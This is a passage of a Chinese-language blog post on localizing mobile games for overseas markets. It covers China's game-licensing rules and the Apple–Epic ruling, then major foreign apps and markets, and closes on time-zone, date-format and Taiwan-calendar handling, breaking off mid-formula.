href="https://www.apple.com.cn/newsroom/2021/09/japan-fair-trade-commission-closes-app-store-investigation/">来源</a></td></tr><tr><td>2021-09-10</td><td>Epic诉苹果垄断案裁决：美国联邦法院命令苹果不得禁止应用发商引导用户通过第三方支付平台付费。法院并不认为苹果公司是手游交易市场垄断者，但认为苹果公司禁止将用户导向其他渠道是反竞争行为。</td><td><a href="https://www.documentcloud.org/documents/21060631-apple-epic-judgement">来源1</a>、<a href="https://www.documentcloud.org/documents/21060697-apple-epic-judgment">来源2</a></td></tr></tbody></table><p><strong>有几个关键的结论：</strong></p><ol><li>“苹果的限制引导条款向消费者隐藏了关键信息，非法地剥夺了消费者的选择。”，所以，要求苹果允许美国开发商引导用户使用苹果应用内购买系统外的支付方式。</li><li>“要求原告 Epic Games 向苹果支付至少400万美元的违约赔偿金。”</li><li>Epic Games 未能证明苹果垄断了移动游戏市场。</li><li>苹果未能证明对 App Store 交易抽取 30% 分成的合法性。</li><li>即使开发者可以完全停止使用苹果应用内购买系统，苹果仍然可以向开发者收取佣金。</li></ol><blockquote><p>注：Epic和苹果签署的合同有法律效力，前者故意违约应承担赔偿。Epic Games 应支付 2020 年 8 月至 2020 年 10 月期间通过直接付款方式从 iOS 版 Fortnite 应用中向用户收取的 12,167,719 美元收入的 30%，以及 Epic 任何此类收入的 30% 的赔偿金。</p></blockquote><p>目前，已经确定的事实是，从 2022 年初开始，像 Netflix、Spotify 和亚马逊 Kindle 等“阅读器”应用的开发者在其应用内添加网站链接，以便用户设置或管理账户。而Epic诉苹果垄断案裁决，如果没有上诉，苹果将被要求90天后把这一措施扩大到所有类型的应用。</p><p>当然，我们关注的重点还是<strong>游戏</strong>， App Store 交易抽取 30% 佣金，其中最大的收益就是游戏类。苹果在 2017 年 iOS 11 系统，首次对 AppStore 进行了新的设计，增加了 Games 独立标签栏，可想而知，游戏对于苹果来说是非常受(大)欢(蛋)迎(糕)！</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/4545fbc4c95b4309a6d995c8d4471400~tplv-k3u1fbpfcp-watermark.image" alt="16315388249637.jpg"></p><p>我们说了这么多，回过头来看，我们关注的一直还是游戏，而最近：<a href="http://www.nppa.gov.cn/nppa/channels/317.shtml">国家新闻出版署-游戏审批结果</a>，还停留在 2021年07月22日，暂停审批新网络游戏已经一个多月了，大家又开始讨论游戏版号的问题（下文会讲解）。</p><p>所以，我们就来一起聊聊《游戏出海本地化》，本文更多的是大方向的概述，很多细节内容不会一一讲解，因为内容太多不可能面面俱到，所以希望大家有一个全面的了解就够啦~</p><p>本文会从以下四个方面进行展开：</p><ol><li>游戏为什么要出海</li><li>了解常见海外文化</li><li>出海的技术本地化</li><li>分享出海避坑秘籍</li></ol><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/80ac9fbc61684dd99a71efe40d72ad00~tplv-k3u1fbpfcp-watermark.image" alt="page-0002.jpg"></p><h3 id="二、游戏为什么要出海"><a href="#二、游戏为什么要出海" class="headerlink" title="二、游戏为什么要出海"></a>二、游戏为什么要出海</h3><p>越来越多公司关注出海市场，游戏出海的背景是什么？</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/10a0b8972b9b47e1bb0b4bbc032c6af7~tplv-k3u1fbpfcp-watermark.image" alt="page-0003.jpg"></p><p><strong>为什么要出海？</strong></p><ol><li>政策规范</li><li>竞争加剧</li><li>文化传播</li><li>赚更多钱</li></ol><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/800ae999174e4ebebf2f21312fc0e8bf~tplv-k3u1fbpfcp-watermark.image" alt="page-0004.jpg"></p><h4 id="2-1-政策规范"><a href="#2-1-政策规范" class="headerlink" title="2.1 政策规范"></a>2.1 政策规范</h4><p>在国内，运营一款游戏需要什么资质？</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/222ef41f29194986bfbd6d00e060278c~tplv-k3u1fbpfcp-watermark.image" alt="page-0005.jpg"></p><p>大家玩游戏时，如果有留意，可以在游戏启动或者登陆界面，看到类型下图的说明：</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/a28214cb63f94cb3b56e0fbbb01b725d~tplv-k3u1fbpfcp-watermark.image" alt="page-0006.jpg"></p><p><code>审批文号</code>、<code>著作人</code>、<code>登记号</code>、<code>出版号</code>、<code>文网游备字</code>，这些都是什么？</p><p>想要运营一款游戏需要的资质：</p><ol><li>计算机软件著作权证书</li><li>网络文化经营许可证（文网文）</li><li>第二类增值电信业务经营许可证（ICP）</li><li>游戏运营备案（文网游备）</li><li>游戏出版运营批文号（游戏版号）</li></ol><p>这五类资质缺一不可！</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/fe221d7910684141898da1698aaa2c63~tplv-k3u1fbpfcp-watermark.image" alt="page-0007.jpg"></p><p>一般情况下，游戏企业需要先申请软著和文网文；取得文网文后，方可申请ICP和游戏备案；最后用ICP和软著申请版号。</p><p>那么怎么申请这些证件呢？</p><p>不熟悉的朋友，大家可能有点懵，在解答之前，我们换一个问题，游戏产业归谁管？</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/512842d5b210461f9e703752a991e392~tplv-k3u1fbpfcp-watermark.image" alt="16315404974102.jpg"></p><blockquote><p>图片来源：<a href="https://xueqiu.com/1758860965/193106875">很帅的投资客</a></p></blockquote><p>游戏是个文化产品，所以最开始自然是文化部管的。</p><ol><li>2003 年，<strong>文化部</strong>会审查进口网游，也会对国产的网游进行备案。</li><li>2016 年，<strong>国家新闻出版广电总局</strong>先后发布了《网络出版服务管理规定》《关于移动游戏出版服务管理的通知》，开始对游戏进行前置审批。</li><li>2018 年 3 月，中央出台了《深化党和国家机构改革方案》：文化部跟国家旅游局被合并成了<strong>文化和旅游部</strong>（简称：文旅部），国家新闻出版广电总局拆成了三个职能。</li><li>2019 年 7 月，文旅部就把《网络游戏管理暂行办法》废止了，不再担任网络游戏行业管理职责。</li><li>之后，监管游戏产业归 <strong>中央宣传部</strong> 负责。</li></ol><p>综上：</p><ul><li>软著通过 <a href="https://www.ccopyright.com.cn/index.php?optionid=1033">中国版权保护中心（国家版权局）</a> 申请。</li><li>网络文化经营许可证（文网文）通过文化部申请（2019年之前）。</li><li>第二类增值电信业务经营许可证（ICP）通过 <a href="http://www.gov.cn/gongbao/content/2017/content_5240090.htm">电信管理机构</a> 申请。</li><li>游戏运营备案（文网游备）通过文化部申请。</li><li>游戏出版运营批文号（游戏版号）通过中央宣传部申请。</li></ul><p>然而：</p><p>2018年4月，文化部暂停办理网络游戏游戏运营备案。2019年7月23日，文化和旅游部正式印发<a href="http://www.gov.cn/zhengce/zhengceku/2019-12/02/content_5457656.htm">《关于废止〈网络游戏管理暂行办法〉和〈旅游发展规划管理办法〉的决定》</a>，文化部也将正式告别对网络游戏的监管，不再是网络游戏的主管部门，不再担任网络游戏的监管职能。</p><p>所以：</p><ul><li>网络游戏企业不再需要办理《网络文化经营许可证》（文网文）</li><li>网络游戏运营不再需要向文化部履行游戏运营备案（文网游备）</li><li>文化行政部门不再有权就网络游戏运营违规事宜依据《网络游戏管理暂行办法》进行处罚</li></ul><p>简单来说，从 2016 年 7 月 1 日起，所有的手游都必须要申请版号才能运营。</p><p><strong>没有版号，游戏能发行吗？</strong></p><p>答：没有版号的发行物是不能够进行发售或者收费的。所以，在版号没有下来之前，游戏只能以“内测”的方式公测，不能收费！<strong>没有版号的产品一旦进行收费，就是非法出版物！</strong></p><p><strong>版号由两部分组成：</strong></p><ol><li>审批文号：新广出审[xxxx（年）]xxxx号</li><li>国际标准书号（ISBN）：ISBN 978-7-XXXXX-XXX-X</li></ol><p><strong>版号申请流程：</strong></p><p>游戏申请版号，先是由出版社提交申请材料至地方新闻出版局，地方新闻出版局审批通过之后下发“新出音批文”(审查批准号)，连同申报材料提交至「中宣部」国家新闻出版署，版署审批通过之后出具“同意备案的函”，出版单位配发游戏出版物号。</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/dcb5b3c5984c4fcb8759ea9f68d33c76~tplv-k3u1fbpfcp-watermark.image" alt="page-0008.jpg"></p><p>在 <a href="http://www.nppa.gov.cn/nppa/channels/317.shtml">国家新闻出版署-游戏审批结果</a> 页面，还停留在 <a href="http://www.nppa.gov.cn/nppa/contents/320/76768.shtml">2021年7月份国产网络游戏审批信息</a>，暂停审批新网络游戏已经一个多月了，游戏版号的重要性，刚刚已经说明了，如果没有版号，游戏也就没有得到合法性。</p><p>我们在来看看，历版号审批的情况。</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/be82eab394cf44688d3274efb92f00a7~tplv-k3u1fbpfcp-watermark.image" alt="page-0009.jpg"></p><p>2016年，《网络出版服务管理规定》和《关于移动游戏出版服务管理的通知》陆续施行。游戏必须通过出版审批，获得游戏版号后方可上线盈利。</p><p>2018年3月起，游戏版号审批停摆8个月，12月重启审批后，过审游戏数量明显减少。从天眼查的数据中可以看出，2019年吊销、注销的游戏公司数量为4080家。版号或许不是游戏公司倒闭的主要原因，但是版号收紧，影响着小型创业团队的营收和成本，从而加速了部分小型游戏厂商的退场。</p><blockquote><p>来源：<a href="https://www.thepaper.cn/newsDetail_forward_8624260">澎湃新闻</a></p></blockquote><h4 id="2-2-竞争加剧"><a href="#2-2-竞争加剧" class="headerlink" title="2.2 竞争加剧"></a>2.2 竞争加剧</h4><p>什么是红海？<br>什么是蓝海?</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/6aff9864b55541b2b0c16b72e888f31d~tplv-k3u1fbpfcp-watermark.image" alt="page-0010.jpg"></p><ul><li>红海是指已知的市场空间</li><li>蓝海是指未知的市场空间</li></ul><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/0bbf522c1a2a41f99f3a672773333958~tplv-k3u1fbpfcp-watermark.image" alt="page-0011.jpg"></p><p>从表中可以看出，中国游戏市场年收入增加 20.7%，而用户规模只有 3.7%。一方面是 2020 年新冠疫情导致大家居家时间变长，游戏时间占比高。我们想重点表达的是，<strong>用户规模</strong>，在一个现有的市场中，脱颖而出是非常难，而且用户增长规模已经放缓，所以，市场的竞争可想而知。</p><p>游戏作为面向用户的市场，用户数量、用户年龄和喜爱，必然是重中之重。所以，我们来谈谈中国人口红利和老龄化的问题。</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/7181809ab53849d88d6cffe25a7c86d6~tplv-k3u1fbpfcp-watermark.image" alt="page-0012.jpg"></p><ul><li>1950~1957年：第一次婴儿潮（二战结束后，世界范围内婴儿潮）</li><li>1959~1961年：三年自然灾害（1961年：949万）</li><li>1962~1976年：第二次婴儿潮</li><li>1971年：中国开始实行计划生育政策</li><li>1980年：中国开始实行独生子女政策（《独生子女父母光荣证》，享受独生子女父母奖励）</li><li>1982年：计划生育定位国策</li><li>1986~1990年：第三次婴儿潮（50.60后进入结婚生育期）</li><li>1994年：经济不景气</li><li>1998年：金融危机</li><li>2002年：实施《人口与计划生育法》</li><li>2003年：中国每年人口出生数开始基本稳定</li><li>2014年：单独二胎（一方是独生子女的夫妇可生育两个孩子的政策）</li><li>2016年：全面二胎</li><li>2021年：全面三胎</li></ul><p>可以看到，在2016年达到一个人口小高峰后，这几年的人口出生率一直下降。简单来说，每年满足 18 岁的年轻人会越来越少，<strong>用户规模</strong>可想而知，虽然农村的电商市场一直在挖掘，但是想让50.60岁的老人玩游戏，显示不实现。</p><p>人口规模，不仅仅影响游戏，其实影响着国家未来，很显然国家也意识到了，开始抓手。</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/64a49acaec874fd5bea643211693c18f~tplv-k3u1fbpfcp-watermark.image" alt="page-0013.jpg"></p><p>另一方面，移动互联网发展的这十几年，如今的入口已经基本被垄断。竞争的成本越来越高，而新的机会越来越少。</p><h4 id="2-3-文化传播"><a href="#2-3-文化传播" class="headerlink" title="2.3 文化传播"></a>2.3 文化传播</h4><p>贯彻落实总书记重要指示精神，出台一系列政策措施支持鼓励产业发展，严格执行防沉迷有关要求，引导网络游戏出版单位加强社会主义核心价值观、中国梦和传承中华优秀传统文化的内容建设，在丰富多层次文化供给、促进经济社会发展、推动中华文化“走出去”等方面取得积极进展。</p><p>2021年7月27日，<a href="http://www.mofcom.gov.cn/article/h/redht/202107/20210703180727.shtml">关于公示2021-2022年度国家文化出口重点企业和重点项目名单的通知</a>，《2021-2022 年度国家文化出口重点企业公示名单》中，广州三七互娱科技有限公司、米哈游科技（上海）有限公司、杭州网易雷火科技有限公司、深圳市腾讯计算机系统有限公司等入围国家文化出口重点企业，说明游戏已经作为文化输出传播的一部分。</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b3981f23b7ca41d0863953e4192892b6~tplv-k3u1fbpfcp-watermark.image" alt="page-0014.jpg"></p><p>2016年《对话》现场，黄峥就曾为字节跳动的全球化布局献计献策！<a href="https://www.ixigua.com/6856647598594327053?logTag=1c6f3dd6342af7528be5">视频链接</a>，全球化是避免目前中国区内卷的一个可行的方法，所以，游戏出海也成为必然的选择。</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/fbf3e1b92dff4a699751c9003c17589b~tplv-k3u1fbpfcp-watermark.image" alt="page-0016.jpg"></p><p>另一方面，世界五百强企业排名，大多数是能源公司。</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/da4bdb17f6dc45ee9d0c8fe3ae9c8ef0~tplv-k3u1fbpfcp-watermark.image" alt="page-0017.jpg"></p><p>中国特色的还是银行等，华为排在49名，已经是非常了不起的成功。国家也希望更多企业走出去，文化传播。</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/d5e920a6e2ea49e3917776355195fc43~tplv-k3u1fbpfcp-watermark.image" alt="page-0018.jpg"></p><p>文化是什么？看上图，大家都知道是什么品牌，也许这就是文化传播。</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/1443fad3e62247be859ed469d57f7c2f~tplv-k3u1fbpfcp-watermark.image" alt="page-0019.jpg"></p><p>中国不缺少大公司，越来越多影响力，但站在全球化，新文化并不多，了解中国的可能更多是功夫、长城、熊猫等。而游戏作为文化的载体，其实是一种很好的传播方式。</p><h4 id="2-4-赚更多钱"><a href="#2-4-赚更多钱" class="headerlink" title="2.4 赚更多钱"></a>2.4 赚更多钱</h4><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/0130823a53c047009e051d3cddd221e8~tplv-k3u1fbpfcp-watermark.image" alt="page-0020.jpg"></p><p>商业的本质是盈利！</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/7e4d7314e49d45d180c2474c8680afbe~tplv-k3u1fbpfcp-watermark.image" alt="page-0021.jpg"></p><p>合法赚钱是无可厚非的事情。那么出海游戏，当然是选择能赚钱的国家或地区，自然是<strong>市场规模</strong>。游戏市场一般是美国、日本和韩国市场最成熟，用户付费或者游戏时间都会比较好。当然，有市场，竞争自然也会更大。但目前大家出海都是韩国、日本、东南亚地区为主，欧美市场较少，下文会解读。</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/9664f1e8fec8410583a2dd4a9f5308ef~tplv-k3u1fbpfcp-watermark.image" alt="page-0022.jpg"></p><p>了解更多的中国厂商，知己知彼！对于新手来说，摸着石头过河，可能站在巨人肩膀上更加不容易失败。</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c1a9dd4c720d4abc8e4f122dbd362344~tplv-k3u1fbpfcp-watermark.image" alt="page-0023.jpg"></p><p>而中国出海的应用，大多数是游戏，目前最成功的App就是 TikTok 了。</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/bb1a4b75c5b849e99fcc6ff5d4177b65~tplv-k3u1fbpfcp-watermark.image" alt="page-0024.jpg"></p><p>综上，中国游戏为什么要出海，很显然，我们心中应该有自己的答案啦~</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/62298eb426c343249b8c2a74be5202ad~tplv-k3u1fbpfcp-watermark.image" alt="page-0025.jpg"></p><blockquote><p>参考来源：<a href="https://pdf.dfcfw.com/pdf/H3_AP202007311395496379_1.pdf">马阿鑫</a> </p></blockquote><p><strong>中国移动游戏出海发展历程</strong></p><ul><li>2009-2011 年：海外探索阶段：首批中国游戏公司踏足海外设立分公司</li><li>2012-2017 年：快速发展阶段：中国移动游戏海外市场营收快速增长</li><li>2018 年-未来：模式成熟阶段：游戏版号暂停审批，移动游戏出海模式火热</li></ul><h3 id="三、了解常见海外文化"><a href="#三、了解常见海外文化" class="headerlink" title="三、了解常见海外文化"></a>三、了解常见海外文化</h3><p>海外常见国家和地区主流的App和市场渠道</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/85a19c568ce54d3599a1d93b37bd44e6~tplv-k3u1fbpfcp-watermark.image" alt="page-0026.jpg"></p><h4 id="3-1-主流-app"><a href="#3-1-主流-app" class="headerlink" title="3.1 主流 app"></a>3.1 主流 app</h4><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c1a83eec757f4ea0a14ac1fd139abda4~tplv-k3u1fbpfcp-watermark.image" alt="page-0027.jpg"></p><p><strong>Facebook</strong></p><p>不可否认，Facebook 是目前全球最广泛的社交 app，而微信主要还是中国内地和华裔的国家地区。Facebook Messenger 是 Facebook 好友之间聊天的应用，2012 年。Facebook 以 10 亿美元的价格收购在线照片共享服务商 Instagram。2014 年，以 190 亿美元收购快速成长的即时通讯服务公司 WhatsAp，同年以 20 亿美元及股票收购虚拟现实科技公司 Oculus VR。</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/614865444dc24546b44db7d10cb1ef34~tplv-k3u1fbpfcp-watermark.image" alt="page-0028.jpg"></p><p><strong>Google</strong></p><p>谷歌的产品，大家可能最熟悉的是搜索引擎、Gmail 和 YouTube 等。然后，谷歌的产品，可以说非常的广泛和成功，海外市场几乎没有竞争对手。</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/7a382cae1c9742079d4d2d7806fed233~tplv-k3u1fbpfcp-watermark.image" alt="page-0029.jpg"></p><p><strong>Google Play Store</strong></p><p>谷歌 Play 商店是全球最大的安卓应用商店，在谷歌的加持下，是出海必不可少的一个合作伙伴。</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/4f6fe78d9c934235965db8744f2b6467~tplv-k3u1fbpfcp-watermark.image" alt="page-0030.jpg"></p><p><strong>Apple</strong></p><p>苹果就更加不用多说，苹果系统平台，软件+硬件，覆盖了多种的移动互联网。</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/cb44badd65924bc6849afb6dd1294a7e~tplv-k3u1fbpfcp-watermark.image" alt="page-0031.jpg"></p><p>最重要的，就是 App Store 商店，海外的所有 iOS 游戏，唯一下载渠道。</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/9b925c0391ae4f08b1060b25cdf26a0e~tplv-k3u1fbpfcp-watermark.image" alt="page-0032.jpg"></p><p>相对来说，使用频率高的会有以上这些 app，当然，海外还有很多 app，每个国家或者地区，也会有特色的 app，下文会讲解。</p><ul><li>Twitter：类似微博</li><li>Telegram（非正式简称TG或电报）：安全可靠的通讯工具，免费、无广告</li><li>TikTok：抖音</li><li>Snapchat：实时照片和视频分享社交应用，“阅后即焚”照片分享、年轻人</li><li>Quora：在线问答，类似知乎</li><li>Reddit：用户自动发掘内容和分享的平台，美国版天涯+贴吧</li></ul><h4 id="3-2-美日韩市场"><a href="#3-2-美日韩市场" class="headerlink" title="3.2 美日韩市场"></a>3.2 美日韩市场</h4><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/3365390c356d4165af8cc192e3a647cf~tplv-k3u1fbpfcp-watermark.image" alt="page-0033.jpg"></p><p>首先，我们来说说海外游戏市场的前3名。美国、日本和韩国。</p><blockquote><p>以下资料来源：<a href="https://pdf.dfcfw.com/pdf/H3_AP202007311395496379_1.pdf">马阿鑫</a> </p></blockquote><p><strong>美国</strong></p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c350a046f4a545f8bdc267cc59067d96~tplv-k3u1fbpfcp-watermark.image" alt="page-0034.jpg"></p><p><strong>日本</strong></p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/7e75e13ec2ae42c89f14b81c102d6c8c~tplv-k3u1fbpfcp-watermark.image" alt="page-0035.jpg"></p><p>日本本地特色的 app 就是 LINE，也会在台湾较多。而雅虎日本 app 也是比较多人用。</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b051a3225ac74c9d928fe90fe73ee9cb~tplv-k3u1fbpfcp-watermark.image" alt="page-0036.jpg"></p><p><strong>韩国</strong></p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/de6cff8a9b4544739a603aab86381914~tplv-k3u1fbpfcp-watermark.image" alt="page-0037.jpg"></p><p>韩国特色 app KakaoTalk 聊天工具，很多表情大家应该看到过。</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/52b625ac7bf4469184e4b9e8385551a6~tplv-k3u1fbpfcp-watermark.image" alt="page-0038.jpg"></p><p>另一款是 Naver，类似国内的百度搜索，Naver Cafe 论坛社区，可以提供游戏里的社交功能。</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/6050253f50bd44dcb4270e8e4116fdab~tplv-k3u1fbpfcp-watermark.image" alt="page-0039.jpg"></p><p>韩国也比较有特色的 app 渠道，OneStore，一个韩国本地的安卓应用商店。Dannal 支付渠道。</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e71ed8cf68e34a5ca03a0eb112f64c12~tplv-k3u1fbpfcp-watermark.image" alt="page-0040.jpg"></p><h4 id="3-3-东南亚"><a href="#3-3-东南亚" class="headerlink" title="3.3 东南亚"></a>3.3 东南亚</h4><p><strong>亚洲文化相似，比较好融入。</strong></p><p>东南亚主要由11国组成：印尼、菲律宾、越南、泰国、缅甸、马来西亚、柬埔寨、老挝、新加坡、东帝汶、文莱。</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/6151a92927134d6d911555d07481211b~tplv-k3u1fbpfcp-watermark.image" alt="page-0041.jpg"></p><p>越南、柬埔寨、缅甸、印度、老挝等都是在中国边境相接，历来也有接触，除了印度，其它跟中国的贸易交流很和平。大家经常听说越南老婆也是这样，虽然语言和文化有差异，但是这些国家因为相对落后，大多数人年轻人学习中文，与中国做生意，或者去中国。</p><p><strong>新马泰</strong>：新加坡、马来西亚、泰国。华人比较多，特别是新加坡，所以文化自然更加接近。</p><p>简单来说，西游记、孙悟空这些故事，武侠小说等，中国游戏的内容，自然更容易有代入感。</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/d6f5dd37f65748dd8522490b8d78cff5~tplv-k3u1fbpfcp-watermark.image" alt="page-0042.jpg"></p><p><strong>新兴市场</strong><br>中国制造业的工厂迁移到东南亚，除了些劳动密集、附加值低。<strong>最大的原因是：东南亚劳动力充足低廉</strong>。东南亚的人口红利不断提升，这就是未来的新兴市场。</p><p>举例来说，越南是一个拥有 9780 万人口的国家（全球第 15 位），越南的人口年龄中位数为 32.7 岁，比泰国年轻 7.6 岁，比美国年轻 5.7 岁。越南还有“移动优先”的文化。有 6800 万智能手机用户，其中 3G、4G 或 5G 用户占比高达 64% 。<a href="https://mp.weixin.qq.com/s/1cZ033an5xi50tYgIqM7zQ">来源</a></p><p>相比美日韩的成熟市场，东南亚拥有 6.5 亿总人口和 3.8 亿互联网用户，但各国间在经济、文化等方面差异巨大，造成目前出海东南亚的困难。未来，不断探索和优化，制作出特色的游戏和体验，也许是一个新的开始。</p><h3 id="四、出海技术的本地化"><a href="#四、出海技术的本地化" class="headerlink" title="四、出海技术的本地化"></a>四、出海技术的本地化</h3><p>海外本地化也给技术带来了不少难题，我们需要注意哪些呢?</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/86c1005c4901455da2c8c303e9d51d70~tplv-k3u1fbpfcp-watermark.image" alt="page-0043.jpg"></p><h4 id="4-1-语言文化"><a href="#4-1-语言文化" class="headerlink" title="4.1 语言文化"></a>4.1 语言文化</h4><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/6d5eed7d05d44bbf80c85ee920e3162e~tplv-k3u1fbpfcp-watermark.image" alt="page-0044.jpg"></p><p>就从聊天工具来说，海外不同的国家和地区会有不一样的选择。所以，了解当地的市场，是出海前要准备的工作。</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/4b3b60e1f56e4a8582a78da77ca70146~tplv-k3u1fbpfcp-watermark.image" alt="page-0045.jpg"></p><p>通常情况下，文字的对齐方式。可能在不同的语言，需要调整不同的对齐方式。</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/591ceec907034d1fb7be8825e02b58b5~tplv-k3u1fbpfcp-watermark.image" alt="page-0046.jpg"></p><p>比如上图，在阿拉伯国家中，就是错误的展示！正确的显示如下：</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/97a40f1ce0c24004abbba3bc2194cf7c~tplv-k3u1fbpfcp-watermark.image" alt="page-0047.jpg"></p><p>所以，入乡随俗，对海外国家的语言文化了解越多是一件好事。</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/1c491e4626374f758f7879b252a64eed~tplv-k3u1fbpfcp-watermark.image" alt="page-0048.jpg"></p><p>比如处理韩语游戏时，收到苹果的邮件，如果同一个账号下有多个游戏，可能都分不清楚是那个游戏是那个，多学一门语言有助益啊。</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/1da3519946314909ba47e854af725c82~tplv-k3u1fbpfcp-watermark.image" alt="page-0049.jpg"></p><p>比如，创建 app 时，填写一个有含义的 SKU，可以方便知道对应的游戏。</p><h4 id="4-2-时区"><a href="#4-2-时区" class="headerlink" title="4.2 时区"></a>4.2 时区</h4><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/03b741d3722e4b1f9c040dbd3875ee1b~tplv-k3u1fbpfcp-watermark.image" alt="page-0050.jpg"></p><p>如果要出海，不可避免的时区。韩国和日本是东9区，比北京时间快 1 小时。东南亚地区基本是东八区时间，所以，不用做太多特殊化处理。</p><p>主要是像俄罗斯有横跨10个时区，搞活动时都比较难统一。欧美地区与北京时区相关很大，所以，数据要怎么显示，比如客户端、web 页面、服务端、后台等，多端之前的时间统一怎么处理。</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/96067191b9764619aec694146b8dfff7~tplv-k3u1fbpfcp-watermark.image" alt="page-0051.jpg"></p><ul><li>GMT（Greenwich Mean Time Zone，格林威治平均时间）</li><li>UTC（Coordinated Universal Time，世界协调时间)</li><li>PST（Pacific Standard Time，太平洋标准时间）</li></ul><p>一般来说，GMT 和  UTC 是等价的时间，而苹果在美国，所以喜欢用 PST 太平洋时间。转换公式：</p><figure class="highlight fix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">北京时间 </span>=<span class="string"> UTC + 8 = GMT +8 = PST + 15（夏令时）= PST + 16（冬令时）</span></span><br></pre></td></tr></table></figure><blockquote><p>关于时区和时间的内容，大家可以自行搜索，这里暂时不展开，或者大家有疑问可以在评论区留言啊。</p></blockquote><p><strong>时间</strong></p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/be04b2b17a24451faaa5c5b1b694b4c8~tplv-k3u1fbpfcp-watermark.image" alt="page-0052.jpg"></p><p>每个国家或地区都有哩语，所以，时间格式也一样，不同的地区，有喜欢 2021-09-14，09-14-2021，或者 09/14/2021 等。总之，如果按用户习惯来显示，那么体验肯定更好，所以，这些细节需要注意。</p><h4 id="4-3-纪元和年号"><a href="#4-3-纪元和年号" class="headerlink" title="4.3 纪元和年号"></a>4.3 纪元和年号</h4><p><strong>台湾的「民国」纪元</strong></p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/bafcc133faa1497bb5d83ce27d16f055~tplv-k3u1fbpfcp-watermark.image" alt="page-0053.jpg"></p><p>在台湾的网站或者报告，经常会看到 <code>107年12月</code> 这样的时间，大家如果不了解，也是很懵。</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/515ac36922544ebf891fc893f807b0db~tplv-k3u1fbpfcp-watermark.image" alt="page-0054.jpg"></p><p>虽然也会用 2021 年这样的日期，但官方一般是使用民国纪元。</p><p><strong>台湾身份证</strong></p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/fe78201570834f738e295abe976e4af2~tplv-k3u1fbpfcp-watermark.image" alt="page-0055.jpg"></p><p>甚至在身份证上，也是这样写 <code>民国 57 年 6 月 5日</code>，其实，57年不是1957年，而是民國54年！加上辛亥革命那年的1911，也就是1968年，才是公元的出生年分。</p><p>换算公式：</p><figure class="highlight fix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">公元日期 </span>=<span class="string"> 民国 + 